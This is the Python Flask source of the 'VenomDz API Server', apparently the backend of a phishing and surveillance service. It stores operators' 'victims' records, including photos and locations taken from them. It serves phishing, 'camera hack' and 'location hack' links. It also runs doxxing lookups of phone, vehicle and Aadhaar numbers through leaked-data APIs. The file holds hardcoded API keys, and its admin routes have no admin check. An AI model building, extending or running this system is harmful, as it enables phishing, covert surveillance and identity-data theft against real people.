from flask import Flask, jsonify, request
import requests
import firebase_admin
from firebase_admin import auth, credentials, db
import json
import os
import logging
from functools import wraps
import datetime
import re
from urllib.parse import urlparse
import time

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Firebase Initialization
try:
    if os.environ.get('FIREBASE_SERVICE_ACCOUNT'):
        service_account_info = json.loads(os.environ.get('FIREBASE_SERVICE_ACCOUNT'))
        cred = credentials.Certificate(service_account_info)
        firebase_admin.initialize_app(cred, {
            'databaseURL': 'https://trackotopwebz-default-rtdb.firebaseio.com/'
        })
        firebase_initialized = True
        logger.info("✅ Firebase initialized successfully")
    else:
        firebase_initialized = False
        logger.warning("⚠️ Firebase service account not found")
except Exception as e:
    firebase_initialized = False
    logger.error(f"❌ Firebase initialization failed: {e}")

# ==================== AUTHENTICATION MIDDLEWARE ====================

def token_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        token = None
        
        if 'Authorization' in request.headers:
            auth_header = request.headers['Authorization']
            if auth_header.startswith('Bearer '):
                token = auth_header.split(' ')[1]
        
        if not token:
            return jsonify({'success': False, 'error': 'Token is missing'}), 401
        
        try:
            decoded_token = auth.verify_id_token(token)
            request.user = decoded_token
        except Exception as e:
            logger.error(f"Token verification failed: {e}")
            return jsonify({'success': False, 'error': 'Token is invalid'}), 401
        
        return f(*args, **kwargs)
    return decorated_function

def firebase_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not firebase_initialized:
            return jsonify({'success': False, 'error': 'Firebase not configured'}), 500
        return f(*args, **kwargs)
    return decorated_function

# ==================== AUTHENTICATION ROUTES ====================

@app.route('/auth/verify-token', methods=['POST'])
def verify_token():
    """Verify Firebase ID token"""
    try:
        data = request.json
        token = data.get('token')
        
        if not token:
            return jsonify({'success': False, 'error': 'Token is required'}), 400
        
        decoded_token = auth.verify_id_token(token)
        
        return jsonify({
            'success': True,
            'user': {
                'uid': decoded_token['uid'],
                'email': decoded_token.get('email'),
                'email_verified': decoded_token.get('email_verified', False)
            }
        })
        
    except Exception as e:
        logger.error(f"Token verification error: {e}")
        return jsonify({'success': False, 'error': 'Invalid token'}), 401

@app.route('/auth/create-user', methods=['POST'])
@firebase_required
def create_user():
    """Create new user in Firebase Auth"""
    try:
        data = request.json
        email = data.get('email')
        password = data.get('password')
        
        if not email or not password:
            return jsonify({'success': False, 'error': 'Email and password are required'}), 400
        
        # Create user in Firebase Auth
        user = auth.create_user(
            email=email,
            password=password,
            email_verified=False
        )
        
        # Create user data in Realtime Database
        user_ref = db.reference(f'/Users/{user.uid}')
        user_ref.set({
            'email': email,
            'uid': user.uid,
            'createdAt': datetime.datetime.utcnow().isoformat(),
            'lastLogin': datetime.datetime.utcnow().isoformat(),
            'totalTargets': 0,
            'rank': 0,
            'newVictims': 0,
            'account_status': {
                'unlocked': False,
                'time': None
            }
        })
        
        return jsonify({
            'success': True,
            'message': 'User created successfully',
            'user': {
                'uid': user.uid,
                'email': user.email
            }
        })
        
    except Exception as e:
        logger.error(f"User creation error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 400

@app.route('/auth/login', methods=['POST'])
def login_user():
    """Login user using Firebase REST API"""
    try:
        data = request.json
        email = data.get('email')
        password = data.get('password')
        
        if not email or not password:
            return jsonify({'success': False, 'error': 'Email and password are required'}), 400
        
        # Firebase REST API for signin
        firebase_api_key = "AIzaSyC3HsILxOpikpl4JFuY3SnCj8CW0uMdRys"
        signin_url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={firebase_api_key}"
        
        response = requests.post(signin_url, json={
            'email': email,
            'password': password,
            'returnSecureToken': True
        })
        
        if response.status_code == 200:
            firebase_data = response.json()
            
            # Update last login in database
            if firebase_initialized:
                user_ref = db.reference(f'/Users/{firebase_data["localId"]}')
                user_ref.update({
                    'lastLogin': datetime.datetime.utcnow().isoformat()
                })
            
            return jsonify({
                'success': True,
                'user': {
                    'uid': firebase_data['localId'],
                    'email': firebase_data['email'],
                    'idToken': firebase_data['idToken'],
                    'refreshToken': firebase_data['refreshToken']
                }
            })
        else:
            error_data = response.json()
            return jsonify({
                'success': False,
                'error': error_data.get('error', {}).get('message', 'Login failed')
            }), 401
            
    except Exception as e:
        logger.error(f"Login error: {e}")
        return jsonify({'success': False, 'error': 'Login failed'}), 500

@app.route('/auth/refresh-token', methods=['POST'])
def refresh_token():
    """Refresh Firebase ID token"""
    try:
        data = request.json
        refresh_token = data.get('refresh_token')
        
        if not refresh_token:
            return jsonify({'success': False, 'error': 'Refresh token is required'}), 400
        
        firebase_api_key = "AIzaSyC3HsILxOpikpl4JFuY3SnCj8CW0uMdRys"
        refresh_url = f"https://securetoken.googleapis.com/v1/token?key={firebase_api_key}"
        
        response = requests.post(refresh_url, data={
            'grant_type': 'refresh_token',
            'refresh_token': refresh_token
        })
        
        if response.status_code == 200:
            token_data = response.json()
            return jsonify({
                'success': True,
                'id_token': token_data['id_token'],
                'refresh_token': token_data['refresh_token']
            })
        else:
            return jsonify({'success': False, 'error': 'Token refresh failed'}), 401
            
    except Exception as e:
        logger.error(f"Token refresh error: {e}")
        return jsonify({'success': False, 'error': 'Token refresh failed'}), 500

@app.route('/auth/reset-password', methods=['POST'])
def reset_password():
    """Send password reset email"""
    try:
        data = request.json
        email = data.get('email')
        
        if not email:
            return jsonify({'success': False, 'error': 'Email is required'}), 400
        
        firebase_api_key = "AIzaSyC3HsILxOpikpl4JFuY3SnCj8CW0uMdRys"
        reset_url = f"https://identitytoolkit.googleapis.com/v1/accounts:sendOobCode?key={firebase_api_key}"
        
        response = requests.post(reset_url, json={
            'requestType': 'PASSWORD_RESET',
            'email': email
        })
        
        if response.status_code == 200:
            return jsonify({
                'success': True,
                'message': 'Password reset email sent successfully'
            })
        else:
            error_data = response.json()
            return jsonify({
                'success': False,
                'error': error_data.get('error', {}).get('message', 'Password reset failed')
            }), 400
            
    except Exception as e:
        logger.error(f"Password reset error: {e}")
        return jsonify({'success': False, 'error': 'Password reset failed'}), 500

# ==================== ACCOUNT MANAGEMENT ====================

@app.route('/account/check-status/<user_id>')
@firebase_required
def check_account_status(user_id):
    """Check if user account is unlocked"""
    try:
        user_ref = db.reference(f'/Users/{user_id}/account_status')
        account_data = user_ref.get()
        
        if account_data and account_data.get('unlocked'):
            # Check if subscription has expired
            if account_data.get('time'):
                expiry_time = datetime.datetime.fromisoformat(account_data['time'])
                if datetime.datetime.utcnow() > expiry_time:
                    return jsonify({
                        'success': True,
                        'unlocked': False,
                        'expired': True
                    })
            
            return jsonify({
                'success': True,
                'unlocked': True,
                'expired': False
            })
        else:
            return jsonify({
                'success': True,
                'unlocked': False,
                'expired': False
            })
            
    except Exception as e:
        logger.error(f"Account status check error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/account/unlock', methods=['POST'])
@firebase_required
@token_required
def unlock_account():
    """Unlock user account with access key"""
    try:
        user_id = request.user['uid']
        data = request.json
        access_key = data.get('access_key')
        
        if not access_key:
            return jsonify({'success': False, 'error': 'Access key is required'}), 400
        
        # Simulate key validation (replace with actual validation)
        is_valid = simulate_key_validation(access_key)
        
        if is_valid:
            # Unlock account for 30 days
            expiry_time = datetime.datetime.utcnow() + datetime.timedelta(days=30)
            
            user_ref = db.reference(f'/Users/{user_id}/account_status')
            user_ref.set({
                'unlocked': True,
                'time': expiry_time.isoformat(),
                'unlocked_at': datetime.datetime.utcnow().isoformat()
            })
            
            return jsonify({
                'success': True,
                'message': 'Account unlocked successfully!',
                'expires_at': expiry_time.isoformat()
            })
        else:
            return jsonify({
                'success': False,
                'error': 'Invalid access key'
            }), 400
            
    except Exception as e:
        logger.error(f"Account unlock error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

def simulate_key_validation(key):
    """Simulate access key validation (replace with actual implementation)"""
    return len(key) >= 10  # Simple simulation

# ==================== PROTECTED DATA ROUTES ====================

@app.route('/data/victims', methods=['GET'])
@token_required
@firebase_required
def get_user_victims():
    """Get all victims for authenticated user"""
    try:
        user_id = request.user['uid']
        ref = db.reference(f'/Users/{user_id}/victims')
        victims_data = ref.get()
        
        return jsonify({
            'success': True,
            'user_id': user_id,
            'victims_count': len(victims_data) if victims_data else 0,
            'data': victims_data or {}
        })
        
    except Exception as e:
        logger.error(f"Victims fetch error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/data/victims', methods=['POST'])
@token_required
@firebase_required
def add_victim():
    """Add new victim data"""
    try:
        user_id = request.user['uid']
        data = request.json
        victim_data = data.get('victim_data')
        
        if not victim_data:
            return jsonify({'success': False, 'error': 'victim_data is required'}), 400
        
        victim_id = f"victim_{int(time.time())}_{user_id[-6:]}"
        
        ref = db.reference(f'/Users/{user_id}/victims/{victim_id}')
        ref.set({
            **victim_data,
            'created_at': datetime.datetime.utcnow().isoformat(),
            'victim_id': victim_id
        })
        
        # Update user stats
        user_ref = db.reference(f'/Users/{user_id}')
        user_ref.update({
            'totalTargets': firebase_admin.db.ServerValue.increment(1),
            'newVictims': firebase_admin.db.ServerValue.increment(1)
        })
        
        return jsonify({
            'success': True,
            'victim_id': victim_id,
            'message': 'Victim data saved successfully'
        })
        
    except Exception as e:
        logger.error(f"Victim add error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/data/victims/<victim_id>', methods=['DELETE'])
@token_required
@firebase_required
def delete_victim(victim_id):
    """Delete specific victim"""
    try:
        user_id = request.user['uid']
        
        ref = db.reference(f'/Users/{user_id}/victims/{victim_id}')
        ref.delete()
        
        # Update user stats
        user_ref = db.reference(f'/Users/{user_id}')
        user_ref.update({
            'totalTargets': firebase_admin.db.ServerValue.increment(-1)
        })
        
        return jsonify({
            'success': True,
            'message': 'Victim deleted successfully'
        })
        
    except Exception as e:
        logger.error(f"Victim delete error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/data/gallery', methods=['GET'])
@token_required
@firebase_required
def get_gallery():
    """Get user gallery images"""
    try:
        user_id = request.user['uid']
        ref = db.reference(f'/Users/{user_id}/Gallery/photos')
        gallery_data = ref.get()
        
        return jsonify({
            'success': True,
            'user_id': user_id,
            'images_count': len(gallery_data) if gallery_data else 0,
            'data': gallery_data or {}
        })
        
    except Exception as e:
        logger.error(f"Gallery fetch error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/data/gallery', methods=['POST'])
@token_required
@firebase_required
def add_gallery_image():
    """Add image to gallery"""
    try:
        user_id = request.user['uid']
        data = request.json
        image_name = data.get('image_name')
        image_url = data.get('image_url')
        
        if not image_name or not image_url:
            return jsonify({'success': False, 'error': 'image_name and image_url are required'}), 400
        
        ref = db.reference(f'/Users/{user_id}/Gallery/photos/{image_name}')
        ref.set(image_url)
        
        return jsonify({
            'success': True,
            'message': 'Image added to gallery successfully'
        })
        
    except Exception as e:
        logger.error(f"Gallery add error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/data/location', methods=['GET'])
@token_required
@firebase_required
def get_locations():
    """Get user location data"""
    try:
        user_id = request.user['uid']
        ref = db.reference(f'/Users/{user_id}/Location/located')
        location_data = ref.get()
        
        return jsonify({
            'success': True,
            'user_id': user_id,
            'locations_count': len(location_data) if location_data else 0,
            'data': location_data or {}
        })
        
    except Exception as e:
        logger.error(f"Location fetch error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ==================== PUBLIC DATA ROUTES ====================

@app.route('/public/links')
@firebase_required
def get_public_links():
    """Get all phishing links (public)"""
    try:
        ref = db.reference('/links')
        links_data = ref.get()
        
        return jsonify({
            'success': True,
            'links_count': len(links_data) if links_data else 0,
            'data': links_data or {}
        })
        
    except Exception as e:
        logger.error(f"Links fetch error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/public/camera-links')
@firebase_required
def get_camera_links():
    """Get camera hack links"""
    try:
        ref = db.reference('camera hack/links')
        links_data = ref.get()
        
        return jsonify({
            'success': True,
            'data': links_data or {}
        })
        
    except Exception as e:
        logger.error(f"Camera links fetch error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/public/location-links')
@firebase_required
def get_location_links():
    """Get location hack links"""
    try:
        ref = db.reference('location hack/links')
        links_data = ref.get()
        
        return jsonify({
            'success': True,
            'data': links_data or {}
        })
        
    except Exception as e:
        logger.error(f"Location links fetch error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/public/info-links')
@firebase_required
def get_info_links():
    """Get info extractor links"""
    try:
        ref = db.reference('info links/links')
        links_data = ref.get()
        
        return jsonify({
            'success': True,
            'data': links_data or {}
        })
        
    except Exception as e:
        logger.error(f"Info links fetch error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ==================== EXTERNAL LOOKUP APIs ====================

@app.route('/lookup/phone/<number>')
def phone_number_info(number):
    """Get phone number information"""
    if not number.isdigit() or len(number) != 10:
        return jsonify({'error': 'Invalid phone number format. Must be 10 digits.'}), 400
    
    try:
        api_url = f"https://demon.taitanx.workers.dev/?mobile={number}"
        response = requests.get(api_url, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            return jsonify({
                'success': True,
                'number': number,
                'data': data
            })
        else:
            return jsonify({
                'success': False,
                'error': 'API request failed',
                'status_code': response.status_code
            }), 500
            
    except Exception as e:
        logger.error(f"Phone lookup error: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/lookup/vehicle/<vehicle_number>')
def vehicle_info(vehicle_number):
    """Get vehicle information"""
    try:
        vehicle_number = vehicle_number.upper().strip()
        
        proxy_url = 'https://corsproxy.io/?'
        api_url = f"https://vehicleinfobyterabaap.vercel.app/lookup?rc={vehicle_number}"
        final_url = proxy_url + requests.utils.quote(api_url)
        
        response = requests.get(final_url, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            
            if data and data.get("Owner Name"):
                return jsonify({
                    'success': True,
                    'vehicle_number': vehicle_number,
                    'data': data
                })
            else:
                return jsonify({
                    'success': False,
                    'error': 'No vehicle data found'
                }), 404
        else:
            # Try alternative proxy
            alt_proxy_url = f"https://api.allorigins.win/raw?url={requests.utils.quote(api_url)}"
            alt_response = requests.get(alt_proxy_url, timeout=15)
            
            if alt_response.status_code == 200:
                data = alt_response.json()
                return jsonify({
                    'success': True,
                    'vehicle_number': vehicle_number,
                    'data': data
                })
            else:
                return jsonify({
                    'success': False,
                    'error': 'Vehicle API not available'
                }), 503
                
    except Exception as e:
        logger.error(f"Vehicle lookup error: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/lookup/ip/<ip>')
def ip_info(ip):
    """Get IP address information"""
    try:
        api_url = f"https://findipinfo.net/api/ipinfo/5a39dc17447a439ae25a02c091e9d37b57253915?ip={ip}"
        response = requests.get(api_url, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            return jsonify({
                'success': True,
                'ip': ip,
                'data': data
            })
        else:
            return jsonify({
                'success': False,
                'error': 'IP lookup failed'
            }), 500
            
    except Exception as e:
        logger.error(f"IP lookup error: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/lookup/aadhaar/<aadhaar>')
def aadhaar_info(aadhaar):
    """Get Aadhaar information"""
    if not aadhaar.isdigit() or len(aadhaar) != 12:
        return jsonify({'error': 'Invalid Aadhaar number format. Must be 12 digits.'}), 400
    
    try:
        proxy_url = 'https://cors.eu.org/'
        api_url = f"https://happy-ration-info.vercel.app/fetch?key=paidchx&aadhaar={aadhaar}"
        final_url = proxy_url + api_url
        
        response = requests.get(final_url, timeout=15)
        
        if response.status_code == 200:
            data = response.json()
            return jsonify({
                'success': True,
                'aadhaar': aadhaar,
                'data': data
            })
        else:
            return jsonify({
                'success': False,
                'error': 'Aadhaar API not responding'
            }), 500
            
    except Exception as e:
        logger.error(f"Aadhaar lookup error: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/lookup/ip-geo/<ip>')
def ip_geolocation(ip):
    """Get IP geolocation"""
    try:
        # Try multiple geolocation APIs
        apis = [
            f"https://ipapi.co/{ip}/json/",
            f"http://ip-api.com/json/{ip}"
        ]
        
        for api_url in apis:
            try:
                response = requests.get(api_url, timeout=8)
                if response.status_code == 200:
                    data = response.json()
                    return jsonify({
                        'success': True,
                        'ip': ip,
                        'data': data
                    })
            except:
                continue
        
        return jsonify({
            'success': False,
            'error': 'All IP location APIs failed'
        }), 500
        
    except Exception as e:
        logger.error(f"IP geolocation error: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/security/phish-check/<path:url>')
def phish_check(url):
    """Check URL for phishing indicators"""
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        analysis = {
            'url': url,
            'risk_score': 0,
            'risk_level': 'LOW',
            'threats': [],
            'recommendation': 'This link appears to be safe'
        }
        
        parsed_url = urlparse(url)
        hostname = parsed_url.hostname.lower()
        
        # Suspicious domain patterns
        suspicious_patterns = [
            'login-', 'verify-', 'security-', 'account-', 'update-',
            'confirm-', 'secure-', 'auth-', 'signin-', 'facebook',
            'google', 'microsoft', 'apple', 'amazon', 'paypal'
        ]
        
        for pattern in suspicious_patterns:
            if pattern in hostname:
                analysis['threats'].append({
                    'type': 'SUSPICIOUS_DOMAIN',
                    'severity': 'HIGH',
                    'message': f'Domain contains suspicious pattern: {pattern}'
                })
                analysis['risk_score'] += 20
        
        # IP address check
        ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
        if ip_pattern.match(hostname):
            analysis['threats'].append({
                'type': 'IP_ADDRESS_URL',
                'severity': 'MEDIUM',
                'message': 'URL uses IP address instead of domain name'
            })
            analysis['risk_score'] += 15
        
        # HTTPS check
        if parsed_url.scheme != 'https':
            analysis['threats'].append({
                'type': 'NO_HTTPS',
                'severity': 'MEDIUM',
                'message': 'Connection is not secure (HTTP instead of HTTPS)'
            })
            analysis['risk_score'] += 10
        
        # Risk level determination
        if analysis['risk_score'] >= 30:
            analysis['risk_level'] = 'HIGH'
            analysis['recommendation'] = 'DO NOT VISIT - This link appears to be malicious'
        elif analysis['risk_score'] >= 15:
            analysis['risk_level'] = 'MEDIUM'
            analysis['recommendation'] = 'Be cautious - This link shows suspicious characteristics'
        
        analysis['total_threats'] = len(analysis['threats'])
        
        return jsonify({
            'success': True,
            'analysis': analysis
        })
        
    except Exception as e:
        logger.error(f"Phish check error: {e}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

# ==================== ADMIN ROUTES ====================

@app.route('/admin/users')
@token_required
@firebase_required
def admin_get_users():
    """Get all users (admin only)"""
    try:
        # Check if user is admin (you can implement admin check)
        ref = db.reference('/Users')
        users_data = ref.get()
        
        return jsonify({
            'success': True,
            'users_count': len(users_data) if users_data else 0,
            'data': users_data or {}
        })
        
    except Exception as e:
        logger.error(f"Admin users fetch error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/admin/stats')
@token_required
@firebase_required
def admin_stats():
    """Get admin statistics"""
    try:
        users_ref = db.reference('/Users')
        users_data = users_ref.get()
        
        total_users = len(users_data) if users_data else 0
        total_victims = 0
        
        if users_data:
            for user_id, user_data in users_data.items():
                if user_data.get('victims'):
                    total_victims += len(user_data['victims'])
        
        return jsonify({
            'success': True,
            'stats': {
                'total_users': total_users,
                'total_victims': total_victims,
                'active_users': total_users,  # You can implement active users logic
                'server_status': 'healthy'
            }
        })
        
    except Exception as e:
        logger.error(f"Admin stats error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# ==================== HEALTH & INFO ====================

@app.route('/')
def home():
    return jsonify({
        'message': '🚀 VenomDz API Server - Full System',
        'status': 'active',
        'firebase': 'connected' if firebase_initialized else 'disconnected',
        'version': '3.0.0',
        'endpoints': {
            'auth': {
                '/auth/login': 'User login',
                '/auth/create-user': 'User registration',
                '/auth/verify-token': 'Token verification',
                '/auth/reset-password': 'Password reset'
            },
            'account': {
                '/account/check-status/<user_id>': 'Check account status',
                '/account/unlock': 'Unlock account'
            },
            'data': {
                '/data/victims': 'Manage victims',
                '/data/gallery': 'Manage gallery',
                '/data/location': 'Manage locations'
            },
            'lookup': {
                '/lookup/phone/<number>': 'Phone lookup',
                '/lookup/vehicle/<number>': 'Vehicle lookup',
                '/lookup/ip/<ip>': 'IP lookup',
                '/lookup/aadhaar/<aadhaar>': 'Aadhaar lookup',
                '/security/phish-check/<url>': 'Phishing check'
            },
            'public': {
                '/public/links': 'Get phishing links',
                '/public/camera-links': 'Get camera links',
                '/public/location-links': 'Get location links'
            }
        }
    })

@app.route('/health')
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.datetime.utcnow().isoformat(),
        'service': 'VenomDz Full API Server',
        'firebase_status': 'connected' if firebase_initialized else 'disconnected',
        'version': '3.0.0'
    })

# ==================== ERROR HANDLERS ====================

@app.errorhandler(404)
def not_found(error):
    return jsonify({'success': False, 'error': 'Endpoint not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    return jsonify({'success': False, 'error': 'Internal server error'}), 500

@app.errorhandler(401)
def unauthorized(error):
    return jsonify({'success': False, 'error': 'Unauthorized access'}), 401

@app.errorhandler(403)
def forbidden(error):
    return jsonify({'success': False, 'error': 'Access forbidden'}), 403

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
